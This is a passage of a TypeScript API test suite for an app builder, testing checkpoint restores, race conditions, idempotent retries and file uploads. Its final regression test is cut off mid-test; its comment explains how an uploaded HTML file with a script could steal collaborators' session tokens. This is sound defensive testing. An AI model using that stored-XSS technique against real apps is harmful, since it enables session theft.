    mkdirSync(fileDir, { recursive: true });
    const filePath = path.join(fileDir, filename);
    writeFileSync(filePath, "%PDF-fake-contents");
    assert.ok(existsSync(filePath), "the fixture file must actually exist before the restore, or this test would prove nothing");

    insertRecord(db, projectId, specWithFileAttachment.entities[0], {
      title: "Contract",
      attachment: JSON.stringify({
        url: `/api/uploads/${projectId}/Document/${filename}`,
        name: "contract.pdf",
        size: 19,
        mimeType: "application/pdf",
      }),
    });

    // Restoring the original checkpoint moves "attachment" back to "text"
    // -- the exact transition that used to leave the real file above
    // permanently orphaned on disk forever.
    const restoreRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(restoreRes.status, 200);

    assert.equal(existsSync(filePath), false, "the orphaned upload must actually be deleted from disk, not just left unreferenced");
  });
});

/**
 * Round 991: unlike /build, /refine, /answers, and DELETE /projects/:id,
 * the checkpoint-restore route only ever CHECKED activePipelines before
 * this round -- it never SET it for its own duration. That used to look
 * safe because restore's own read-project.spec-then-write-it-back body was
 * believed to have no genuine await in between (so nothing else could ever
 * run mid-restore), but round 977 (the fixture test just above) added a
 * real one: `await cleanupFileFieldsRetypedAway(...)`, which does genuine
 * disk I/O (fs.rm per affected row) for every record whose file field just
 * got retyped away. During that await, an ordinary "quick" mutation route
 * (entity/field label rename, roles, ...) that only checks activePipelines
 * -- never sets it -- could still read project.spec, apply its own change,
 * and return 200 to its caller, only for restore's own updateProjectSpec
 * to silently overwrite the whole spec with the checkpoint's frozen
 * snapshot the instant it resumes, discarding that change with no error to
 * either side.
 *
 * Deterministically forcing a real await to take enough wall-clock time to
 * race against is awkward here: unlike /refine's AI call or WhatsApp's
 * socket, there is no existing test seam that gates cleanupFileFieldsRetyped
 * Away's own timing, and this codebase otherwise never relies on bare
 * fetch() timing for a race assertion. The approach below still avoids
 * that: cleanupFileFieldsRetypedAway awaits a real `Promise.all` of one
 * `fs.rm` per affected row, each of which is dispatched to libuv's
 * threadpool -- while that's pending, Node's single JS main thread has
 * nothing else to do and so WILL service any other already-queued work,
 * including a concurrently-fired HTTP request's own handler. Inserting
 * enough affected rows (verified empirically: ~800 concurrent fs.rm calls,
 * even against files that don't exist on disk, reliably take tens of
 * milliseconds in wall-clock terms) makes that window wide and real rather
 * than a hoped-for microtask coincidence, so firing the second request
 * immediately after (not awaited in between, so both are in flight
 * together) lands inside it deterministically rather than by luck.
 */
test("renaming an entity's label while a checkpoint restore is still cleaning up its own retyped-away file fields is rejected with 409, instead of racing restore's own spec write-back", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `restore-cleanup-race-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const specWithTextAttachment: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Document",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "attachment", type: "text", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const specWithFileAttachment: ProductSpec = {
      ...specWithTextAttachment,
      entities: [
        {
          name: "Document",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "attachment", type: "file", required: false },
          ],
        },
      ],
    };

    const projectId = randomUUID();
    insertProject(db, {
      id: projectId,
      ownerId: user.id,
      name: "Docs",
      description: "A document tracker.",
      spec: specWithTextAttachment,
    });
    diffAndMigrate(db, projectId, undefined, specWithTextAttachment);
    const checkpoint = insertCheckpoint(db, {
      id: randomUUID(),
      projectId,
      label: "Initial build",
      kind: "build",
      spec: specWithTextAttachment,
    });

    diffAndMigrate(db, projectId, specWithTextAttachment, specWithFileAttachment);
    updateProjectSpec(db, projectId, specWithFileAttachment);

    // 800 records each carrying a real-shaped (but never actually written
    // to disk -- unnecessary for this test, and confirmed above that
    // fs.rm({force: true}) on a missing file still costs a real syscall)
    // file descriptor in "attachment", so the restore below has enough
    // genuinely slow disk I/O to await that a concurrent request reliably
    // lands inside that window.
    for (let i = 0; i < 800; i++) {
      insertRecord(db, projectId, specWithFileAttachment.entities[0], {
        title: `Contract ${i}`,
        attachment: JSON.stringify({
          url: `/api/uploads/${projectId}/Document/${randomUUID()}.pdf`,
          name: "contract.pdf",
          size: 19,
          mimeType: "application/pdf",
        }),
      });
    }

    // Fired together, neither awaited before the other starts, so both are
    // genuinely in flight on the server at the same time.
    const restorePromise = fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    const labelPromise = fetch(`${baseUrl}/api/projects/${projectId}/entities/Document/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "מסמך VIP" }),
    });

    const [restoreRes, labelRes] = await Promise.all([restorePromise, labelPromise]);
    const labelBody = (await labelRes.json()) as { code?: string };

    assert.equal(restoreRes.status, 200, "the restore itself must still succeed");
    assert.equal(labelRes.status, 409, "the concurrent rename must be rejected while the restore is still in flight");
    assert.equal(labelBody.code, "PIPELINE_IN_PROGRESS");

    // Once the restore has genuinely finished, renaming the same label must succeed normally.
    const labelAgainRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Document/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "מסמך VIP" }),
    });
    assert.equal(labelAgainRes.status, 200);
  });
});

/**
 * Round 956: unlike deleteCheckpoint (round 944, a plain 204 with nothing
 * to get wrong on replay), POST .../restore's response PAYLOAD itself
 * depends on reading project.spec BEFORE the restore overwrites it. A
 * response lost in transit after the server already committed used to mean
 * the retry re-read project.spec as the value THIS SAME restore had just
 * written (now equal to checkpoint.spec), diffed it against itself, and
 * came back with migrationWarning: null -- silently downgrading a real
 * hazard warning to "nothing to report." Reuses the exact same
 * boolean-retyped-to-text fixture as the migrationWarning test just above,
 * so the first call is proven to produce a genuine, non-null warning before
 * the retry is checked against it.
 */
test("POST .../restore retried with the same idempotency key after the first attempt already succeeded replays the original migrationWarning, instead of silently re-diffing the already-restored spec against itself", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `restore-idem-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const specWithBooleanWon: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Deal",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "won", type: "boolean", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const specWithTextWon: ProductSpec = {
      ...specWithBooleanWon,
      entities: [
        {
          name: "Deal",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "won", type: "text", required: false },
          ],
        },
      ],
    };

    const projectId = randomUUID();
    insertProject(db, {
      id: projectId,
      ownerId: user.id,
      name: "Deal tracker",
      description: "A CRM for tracking deals.",
      spec: specWithTextWon,
    });
    diffAndMigrate(db, projectId, undefined, specWithTextWon);
    const checkpoint = insertCheckpoint(db, {
      id: randomUUID(),
      projectId,
      label: "Initial build",
      kind: "build",
      spec: specWithTextWon,
    });
    diffAndMigrate(db, projectId, specWithTextWon, specWithBooleanWon);
    updateProjectSpec(db, projectId, specWithBooleanWon);

    const headers = { ...authHeaders(token), "x-idempotency-key": "restore-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers,
    });
    assert.equal(firstRes.status, 200);
    const firstBody = (await firstRes.json()) as { migrationWarning: string | null };
    // Round 1198: restoring moves "won" from boolean back to TEXT -- its
    // physical type the whole time (the column was built that way) -- so
    // this keeps producing a genuine hazard even after round 1198's fix,
    // which deliberately never suppresses a TEXT-bucket transition (see
    // the migrationWarning test's own doc comment just above for why).
    assert.ok(firstBody.migrationWarning, "the first call must produce a genuine warning -- the premise this test depends on");
    assert.match(firstBody.migrationWarning!, /won \(boolean → text\)/);

    const retryRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers,
    });
    assert.equal(retryRes.status, 200);
    const retryBody = (await retryRes.json()) as { migrationWarning: string | null };
    assert.equal(
      retryBody.migrationWarning,
      firstBody.migrationWarning,
      "a retried restore with the same idempotency key must replay the exact original warning, not silently re-diff the already-restored spec against itself and report nothing",
    );
  });
});

/**
 * Round 929: a checkpoint's own spec is a frozen snapshot from whenever it
 * was taken -- restoring it straight, unmodified, used to silently revert
 * any entity/field label the user customized AFTER that checkpoint via
 * EntityLabelEditor/FieldLabelEditor, with zero warning (describeImpactHazards
 * only ever looks at structural field changes, never labels). This is the
 * exact same "a previous customization should survive, by name, onto
 * whatever spec replaces it" problem carryForwardLabels already solves for
 * /refine (round 915/917) -- restore just never called it. Restores the
 * MOST RECENT checkpoint (the one taken seconds before the label rename) to
 * confirm this isn't some edge case about an old checkpoint -- renaming a
 * label and then immediately restoring the checkpoint from right before
 * that rename must still keep the rename, not revert it.
 */
test("restoring a checkpoint keeps an entity/field label customized after that checkpoint was taken, instead of silently reverting it", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `restore-label-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Customer",
          fields: [{ name: "name", type: "text", required: true }],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };

    const projectId = randomUUID();
    insertProject(db, {
      id: projectId,
      ownerId: user.id,
      name: "Customer tracker",
      description: "A CRM for tracking customers.",
      spec,
    });
    diffAndMigrate(db, projectId, undefined, spec);
    const checkpoint = insertCheckpoint(db, {
      id: randomUUID(),
      projectId,
      label: "Initial build",
      kind: "build",
      spec,
    });

    const renameRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/label`, {
      method: "PATCH",
      headers: { ...authHeaders(token), "content-type": "application/json" },
      body: JSON.stringify({ label: "לקוחות" }),
    });
    assert.equal(renameRes.status, 200, "sanity check: the label rename itself must succeed");

    // Restoring the SAME checkpoint just taken, seconds before the rename
    // above -- its own frozen spec has no label at all on "Customer".
    const restoreRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(restoreRes.status, 200);
    const restoreBody = (await restoreRes.json()) as {
      project: { spec: { entities: { name: string; label?: string }[] } };
    };
    assert.equal(
      restoreBody.project.spec.entities.find((e) => e.name === "Customer")!.label,
      "לקוחות",
      "the restore must keep the label customized after this checkpoint was taken, not silently revert it to the checkpoint's own frozen (unset) label",
    );
  });
});

/**
 * Round 787: /build and /refine already warn about a field becoming
 * required where it wasn't, or an entity/field disappearing from the spec
 * entirely (pipeline.ts's own "Architect" message, via computeImpact) --
 * but the checkpoint-restore route never surfaced that same hazard class
 * at all, even though restoring to an older checkpoint can trigger the
 * identical situation: an earlier checkpoint can be STRICTER on a field a
 * later refine relaxed, or simply predate an entity/field the user has
 * been actively using with real data in it. Engineered via the DB layer,
 * same determinism reasoning as the type-mismatch test above.
 */
test("restoring a checkpoint surfaces a migrationWarning when the restored spec re-tightens a field, the same impact warning /refine already gives", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `restore-tighten-warning-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const specWithRequiredEmail: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Customer",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "email", type: "text", required: true },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const specWithOptionalEmail: ProductSpec = {
      ...specWithRequiredEmail,
      entities: [
        {
          name: "Customer",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "email", type: "text", required: false },
          ],
        },
      ],
    };

    const projectId = randomUUID();
    insertProject(db, {
      id: projectId,
      ownerId: user.id,
      name: "CRM",
      description: "A customer tracker.",
      spec: specWithRequiredEmail,
    });
    diffAndMigrate(db, projectId, undefined, specWithRequiredEmail);
    const checkpoint = insertCheckpoint(db, {
      id: randomUUID(),
      projectId,
      label: "Initial build",
      kind: "build",
      spec: specWithRequiredEmail,
    });

    // Simulates a later refine that relaxes "email" to optional -- no
    // warning at this step (loosening a field is never flagged, only
    // tightening).
    diffAndMigrate(db, projectId, specWithRequiredEmail, specWithOptionalEmail);
    updateProjectSpec(db, projectId, specWithOptionalEmail);

    // Restoring the original checkpoint moves "email" back to required --
    // the exact "now enforces stricter rules on" hazard /refine already
    // warns about, now also expected from restore.
    const restoreRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(restoreRes.status, 200);
    const restoreBody = (await restoreRes.json()) as { migrationWarning: string | null };
    assert.ok(restoreBody.migrationWarning, "a migrationWarning must be present given the restored spec re-tightens email");
    assert.match(restoreBody.migrationWarning!, /now enforces stricter rules on: email/);
    assert.match(restoreBody.migrationWarning!, /existing records are unaffected unless edited again/);
  });
});

/**
 * Round 787: the sibling hazard to the field-tightening one above -- an
 * entity added by a later refine simply doesn't exist in an earlier
 * checkpoint, so restoring to it makes that entity (and any real data in
 * it) vanish from every tab in the live app. /refine already warns about
 * this exact situation when an entity disappears from a freshly
 * regenerated spec; restore must give the identical warning.
 */
test("restoring a checkpoint surfaces a migrationWarning naming an entity that doesn't exist in the restored spec, the same impact warning /refine already gives", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `restore-removed-entity-warning-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const specWithJustCustomer: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Customer", fields: [{ name: "name", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const specWithInvoiceToo: ProductSpec = {
      ...specWithJustCustomer,
      entities: [...specWithJustCustomer.entities, { name: "Invoice", fields: [{ name: "total", type: "number", required: true }] }],
    };

    const projectId = randomUUID();
    insertProject(db, {
      id: projectId,
      ownerId: user.id,
      name: "CRM",
      description: "A customer tracker.",
      spec: specWithJustCustomer,
    });
    diffAndMigrate(db, projectId, undefined, specWithJustCustomer);
    const checkpoint = insertCheckpoint(db, {
      id: randomUUID(),
      projectId,
      label: "Initial build",
      kind: "build",
      spec: specWithJustCustomer,
    });

    // Simulates a later refine that adds the Invoice entity.
    diffAndMigrate(db, projectId, specWithJustCustomer, specWithInvoiceToo);
    updateProjectSpec(db, projectId, specWithInvoiceToo);

    // Restoring the original checkpoint drops Invoice back out of the
    // live spec -- the exact "entities are no longer in the spec" hazard
    // /refine already warns about, now also expected from restore.
    const restoreRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(restoreRes.status, 200);
    const restoreBody = (await restoreRes.json()) as { migrationWarning: string | null };
    assert.ok(restoreBody.migrationWarning, "a migrationWarning must be present given Invoice disappears from the restored spec");
    assert.match(restoreBody.migrationWarning!, /entities are no longer in the spec \(Invoice\)/);
  });
});

/**
 * Round 687: diffAndMigrate's own automation-rule-disable sweep
 * (packages/db/src/migrate.ts) silently discarded its outcome instead of
 * reporting it as a real MigrationChange -- confirmed by reading the code
 * directly: disableAutomationRulesForEntity/Field were declared `void` and
 * the sweep's own loops never pushed anything onto the `changes` array
 * describeMigrationHazards(changes) builds its note from. A business
 * owner whose WhatsApp automation stopped firing after a refine or a
 * checkpoint restore had zero trail explaining why -- the exact same
 * "silently discarded hazard" shape the type_changed/relation_* notes
 * already exist to prevent, just for a fourth kind of hazard those three
 * never covered. Engineered via the DB layer, same determinism reasoning
 * as the test above.
 */
test("restoring a checkpoint surfaces a migrationWarning naming how many automation rules were disabled, when the restored spec no longer has the field a rule referenced", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `restore-automation-warning-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const specWithoutStatus: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Deal", fields: [{ name: "title", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const specWithStatus: ProductSpec = {
      ...specWithoutStatus,
      entities: [
        {
          name: "Deal",
          fields: [
            { name: "title", type: "text", required: true },
            { name: "status", type: "enum", required: false, enumValues: ["New", "Won"] },
          ],
        },
      ],
    };

    const projectId = randomUUID();
    insertProject(db, {
      id: projectId,
      ownerId: user.id,
      name: "Deal tracker",
      description: "A CRM for tracking deals.",
      spec: specWithoutStatus,
    });
    diffAndMigrate(db, projectId, undefined, specWithoutStatus);
    const checkpoint = insertCheckpoint(db, {
      id: randomUUID(),
      projectId,
      label: "Before status field",
      kind: "build",
      spec: specWithoutStatus,
    });

    // Simulates a later refine that adds "status", exactly like /refine's
    // own route -- then a real automation rule gets created referencing it.
    diffAndMigrate(db, projectId, specWithoutStatus, specWithStatus);
    updateProjectSpec(db, projectId, specWithStatus);
    const ruleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Deal/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "field_equals",
        fieldName: "status",
        fieldValue: "Won",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "+15551234567",
        messageTemplate: "Deal won!",
      }),
    });
    assert.equal(ruleRes.status, 201);

    // Restoring the earlier checkpoint (no "status" field at all) must
    // disable the rule that now references it, and the restore route's
    // migrationWarning must actually say so.
    const restoreRes = await fetch(`${baseUrl}/api/projects/${projectId}/checkpoints/${checkpoint.id}/restore`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(restoreRes.status, 200);
    const restoreBody = (await restoreRes.json()) as { migrationWarning: string | null };
    assert.ok(restoreBody.migrationWarning, "a migrationWarning must be present given the automation rule this restore just disabled");
    assert.match(restoreBody.migrationWarning!, /1 automation rule\(s\) were disabled/);
    assert.match(restoreBody.migrationWarning!, /re-enable them from the Automations panel/);
  });
});

/**
 * The upload route is a new field type's whole reason to exist: a file
 * field's stored value is a JSON descriptor the client gets back from
 * this route, not something a client could ever construct on its own
 * (there's no real file sitting behind an arbitrary URL it could invent).
 * Exercises the full round trip -- upload, then write that descriptor as
 * a record's field value via the ordinary record-create route, then read
 * the record back -- plus confirms the file this route wrote to disk is
 * actually reachable at the URL it returned, through the real static
 * route mounted in app.ts, not just present on disk.
 */
test("uploading a file for a 'file' field stores it on disk, serves it back at the returned URL, and its descriptor round-trips through a record write", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `upload-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Applicant",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "resume", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const fileBody = "%PDF-fake-resume-contents";
    const formData = new FormData();
    formData.append("file", new File([fileBody], "my resume.pdf", { type: "application/pdf" }));
    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    assert.equal(uploadRes.status, 200);
    const uploadBody = (await uploadRes.json()) as { file: { url: string; name: string; size: number; mimeType: string } };
    assert.equal(uploadBody.file.name, "my resume.pdf");
    assert.equal(uploadBody.file.mimeType, "application/pdf");
    assert.equal(uploadBody.file.size, fileBody.length);
    assert.match(uploadBody.file.url, new RegExp(`^/api/uploads/${projectId}/Applicant/[^/]+\\.pdf$`));

    // The URL this route returned must actually serve the real file back,
    // through app.ts's own static route -- not just a plausible-looking
    // string the client has no way to fetch.
    const servedRes = await fetch(`${baseUrl}${uploadBody.file.url}`);
    assert.equal(servedRes.status, 200);
    assert.equal(await servedRes.text(), fileBody);

    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dana", resume: JSON.stringify(uploadBody.file) }),
    });
    assert.equal(createRes.status, 201);
    const { record } = (await createRes.json()) as { record: { id: number; resume: string } };
    assert.deepEqual(JSON.parse(record.resume), uploadBody.file);

    const getRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, { headers: authHeaders(token) });
    const { records } = (await getRes.json()) as { records: { id: number; resume: string }[] };
    assert.deepEqual(JSON.parse(records.find((r) => r.id === record.id)!.resume), uploadBody.file);
  });
});

/**
 * Round 907: multer's own disk-storage middleware names every file with a
 * fresh randomUUID, so a retried upload (fetchApi's own fetchWithWakeRetry
 * auto-retries on a dropped connection, even one where the server already
 * fully finished and only the response itself got lost -- a FormData
 * wrapping a real File is a re-readable Blob, not a one-shot stream, so
 * the retry successfully re-sends the identical bytes) was physically
 * indistinguishable from a brand-new upload and wrote a second, orphaned
 * file to disk forever, with no cleanup mechanism anywhere for a file no
 * record ever ends up referencing. Confirms a retry with the same
 * idempotency key replays the exact same file descriptor (not a second,
 * different URL) and that only ONE file actually exists on disk
 * afterward, not two.
 */
test("uploading with the same idempotency key after the first attempt already finished replays the original file descriptor, instead of writing a second orphaned file to disk", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-idem-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Applicant",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "resume", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const headers = { authorization: `Bearer ${token}`, "x-idempotency-key": "upload-repro-key" };
    const fileBody = "%PDF-fake-resume-contents";

    const firstFormData = new FormData();
    firstFormData.append("file", new File([fileBody], "resume.pdf", { type: "application/pdf" }));
    const firstRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers,
      body: firstFormData,
    });
    assert.equal(firstRes.status, 200);
    const first = (await firstRes.json()) as { file: { url: string; name: string; size: number; mimeType: string } };

    const retryFormData = new FormData();
    retryFormData.append("file", new File([fileBody], "resume.pdf", { type: "application/pdf" }));
    const retryRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers,
      body: retryFormData,
    });
    assert.equal(retryRes.status, 200);
    const retry = (await retryRes.json()) as { file: { url: string; name: string; size: number; mimeType: string } };
    assert.deepEqual(retry, first, "the retry must replay the exact same file descriptor, not a second, different one");

    const filesOnDisk = readdirSync(path.join(uploadsDir, projectId, "Applicant"));
    assert.equal(filesOnDisk.length, 1, "a retried upload with the same idempotency key must never write a second orphaned file to disk");
  });
});

/**
 * Regression test for a real bug (round 1025): the access/existence check
 * this upload route runs happens before multer's own disk write -- a
 * genuine, potentially long I/O operation on a slow connection or with a
 * large file -- with nothing re-checking existence afterward. A concurrent
 * DELETE /projects/:id on this same project could run to completion
 * (including its own deleteProjectUploads sweep) entirely within that
 * window: multer's destination callback (createUploadMiddleware)
 * unconditionally recreates the project's upload directory via mkdirSync
 * with no existence check of its own, so the write still landed on disk,
 * resurrecting a just-deleted project's upload directory -- permanently
 * orphaned, since nothing ever calls deleteProjectUploads for that project
 * again. Simulates "a slow connection" honestly, with no production-code
 * test hooks: the multipart body is hand-built and streamed to the real
 * server in several chunks with a real delay between each, giving the
 * concurrent DELETE request a genuine, reliable window to land and finish
 * while the upload is still in flight.
 */
test("uploading a file to a project that gets deleted while the (slow) upload is still in flight must not resurrect its deleted upload directory", async () => {
  await withServer(async (baseUrl, db, uploadsDir) => {
    const email = `upload-vs-delete-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Customer",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "receipt", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Customers", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const boundary = `----forgeTestBoundary${randomUUID()}`;
    const head = new TextEncoder().encode(
      `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="receipt.pdf"\r\nContent-Type: application/pdf\r\n\r\n`,
    );
    const tail = new TextEncoder().encode(`\r\n--${boundary}--\r\n`);
    const contentPieces = Array.from({ length: 5 }, (_, i) => new TextEncoder().encode(`fake-receipt-bytes-piece-${i}-`));

    const slowBody = new ReadableStream<Uint8Array>({
      async start(controller) {
        controller.enqueue(head);
        for (const piece of contentPieces) {
          // A real delay between chunks -- the same honest "slow
          // connection" simulation this bug's own repro scenario describes,
          // with no instrumentation added to production code at all.
          await new Promise((resolve) => setTimeout(resolve, 15));
          controller.enqueue(piece);
        }
        controller.enqueue(tail);
        controller.close();
      },
    });

    const uploadPromise = fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/fields/receipt/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}`, "content-type": `multipart/form-data; boundary=${boundary}` },
      body: slowBody,
      duplex: "half",
    } as RequestInit);

    // A short head start so the upload request has genuinely begun (and
    // this route's own first access check has already passed, with the
    // project still present) before the concurrent delete fires -- mirrors
    // the same short-head-start convention the round-539/1024 race tests
    // already use for their own, differently-shaped await windows.
    await new Promise((resolve) => setTimeout(resolve, 20));
    const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}`, { method: "DELETE", headers: authHeaders(token) });
    assert.equal(deleteRes.status, 204);

    const uploadRes = await uploadPromise;
    assert.notEqual(uploadRes.status, 200, "must not report success once the project it targets no longer exists");
    assert.equal(uploadRes.status, 404);
    assert.equal(((await uploadRes.json()) as { code?: string }).code, "PROJECT_NOT_FOUND");

    assert.ok(
      !existsSync(path.join(uploadsDir, projectId)),
      "the just-deleted project's upload directory must not be resurrected by the in-flight upload",
    );
  });
});

/**
 * Round 782: multer (via busboy) decodes a multipart part's
 * `Content-Disposition: filename="..."` header as raw Latin-1 bytes
 * unless `defParamCharset` is explicitly configured, which
 * createUploadMiddleware never does -- but every real browser (and, as
 * confirmed directly, Node's own native fetch/FormData/File, used here)
 * sends a non-ASCII filename as its raw UTF-8 bytes, not RFC 5987
 * percent-encoding. Before the fix, a Hebrew filename like "קורות
 * חיים.pdf" -- an entirely ordinary upload for this app's primary
 * Hebrew-speaking user base -- arrived as mojibake and that corrupted
 * string became the file field's permanent, displayed name everywhere
 * (table cell, CSV/backup export, automation templates, Global Search).
 * Confirms the real upload route now recovers the original Hebrew text.
 */
test("uploading a file with a non-ASCII (Hebrew) filename stores and returns the real original name, not mojibake", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `upload-hebrew-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Applicant",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "resume", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const hebrewFilename = "קורות חיים.pdf";
    const fileBody = "%PDF-fake-resume-contents";
    const formData = new FormData();
    formData.append("file", new File([fileBody], hebrewFilename, { type: "application/pdf" }));
    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
      body: formData,
    });
    assert.equal(uploadRes.status, 200);
    const uploadBody = (await uploadRes.json()) as { file: { url: string; name: string; size: number; mimeType: string } };
    assert.equal(uploadBody.file.name, hebrewFilename, "the real Hebrew filename must survive the round trip, not come back as mojibake");
  });
});

/**
 * Regression test for a stored-XSS/session-theft hole: nothing restricts
 * what content type a file-type field's upload can be, and EntityPanel.tsx
 * opens every uploaded file through a plain <a href> on this app's own
 * origin -- so an uploaded .html file whose body is a <script> would run
 * with access to this app's own localStorage session token the moment any
 * other collaborator (e.g. the project owner, viewing a malicious
 * collaborator's own record) opened its link. app.ts's /api/uploads static
 * route must serve every uploaded file as an attachment (forcing a
 * download instead of an inline render) so this can never execute,
 * regardless of what content type was uploaded.
 */
test("GET /api/uploads/... serves an uploaded .html file with Content-Disposition: attachment, so it can never execute as a page on this app's own origin", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `upload-html-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Applicant",
